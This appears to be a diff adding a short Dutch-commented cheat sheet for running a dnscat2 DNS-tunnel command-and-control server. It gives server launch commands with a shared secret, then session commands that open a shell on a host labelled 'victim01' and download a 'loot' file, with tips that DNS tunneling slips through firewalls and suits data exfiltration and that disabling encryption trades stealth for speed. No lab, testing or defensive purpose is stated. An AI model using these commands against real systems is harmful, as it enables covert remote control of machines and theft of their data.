@@ -1,0 +1,14 @@
+# dnscat2 Server - DNS tunnel voor C2 communicatie
+# Vereiste: Ruby geinstalleerd, authoritative DNS voor domein
+# Stap 1: Start server met shared secret
+ruby dnscat2.rb tunnel.domain.local --secret=sharedsecret --security=open
+# Stap 2: Zonder domein (direct mode - minder stealthy)
+ruby dnscat2.rb --dns server=0.0.0.0,port=53 --secret=sharedsecret
+# Stap 3: Na client verbinding - sessie gebruiken
+# dnscat2> sessions
+# dnscat2> session -i 1
+# command (victim01)> shell
+# command (victim01)> download C:\Windows\tasks\loot.txt /tmp/loot.txt
+# Tip: DNS tunneling werkt vaak door firewalls heen (UDP 53 meestal open)
+# Tip: Langzaam maar betrouwbaar voor data exfiltratie
+# Tip: --security=open schakelt encryptie uit (sneller, minder stealthy)
